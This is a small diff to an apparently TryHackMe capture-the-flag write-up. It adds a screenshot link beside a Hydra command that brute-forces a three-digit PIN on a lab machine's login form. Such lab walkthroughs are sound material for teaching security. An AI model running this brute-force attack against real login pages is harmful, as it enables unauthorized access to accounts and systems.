@@ -26,6 +26,8 @@ The command above specifies the following:
 
 Then you will navigate to the login page of the site. 
 Go to the view source code. 
+![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/fd71f2cc-4db5-42f7-8f7a-b635088abb1d)
+
 ```
 hydra -l '' -P 3digits.txt -f -v 10.10.179.47 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
 ```
